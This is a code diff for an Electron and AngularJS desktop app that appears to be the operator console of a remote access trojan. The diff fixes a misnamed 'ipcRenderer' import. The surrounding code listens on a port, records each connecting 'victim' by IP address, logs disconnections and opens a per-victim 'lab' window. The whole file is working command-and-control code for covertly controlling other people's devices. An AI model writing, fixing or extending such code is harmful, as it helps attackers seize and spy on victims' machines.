@@ -1,5 +1,5 @@
 const { remote } = require('electron');
-const { clientRenderer } = require('electron');
+const { ipcRenderer } = require('electron');
 var app = angular.module('MainApp', []);
 var homeDir = require('homedir');
 var fs = require('fs-extra');
@@ -32,30 +32,30 @@ app.controller('MainCtrl', function($scope) {
       port = 42474;
     }
 
-    clientRenderer.send('SocketIO:Listen', port);
+    ipcRenderer.send('SocketIO:Listen', port);
     $mainCtrl.Log('Listening on port => ' + port, 1);
   };
 
-  clientRenderer.on('SocketIO:NewVictim', function(event, index) {
+  ipcRenderer.on('SocketIO:NewVictim', function(event, index) {
     viclist[index] = victimsList.getVictim(index);
     $mainCtrl.Log('New victim from ' + viclist[index].ip);
     $mainCtrl.$apply();
   });
 
-  clientRenderer.on('SocketIO:Listen', function(event, error) {
+  ipcRenderer.on('SocketIO:Listen', function(event, error) {
     $mainCtrl.Log(error, 0);
     $mainCtrl.isListen = false;
     $mainCtrl.$apply();
   });
 
-  clientRenderer.on('SocketIO:RemoveVictim', function(event, index) {
+  ipcRenderer.on('SocketIO:RemoveVictim', function(event, index) {
     $mainCtrl.Log('Victim disconnected ' + viclist[index].ip);
     delete viclist[index];
     $mainCtrl.$apply();
   });
 
   $mainCtrl.openLab = function(index) {
-    clientRenderer.send('openLabWindow', 'lab.html', index);
+    ipcRenderer.send('openLabWindow', 'lab.html', index);
   };
 
   $mainCtrl.Log = function(msg, status) {
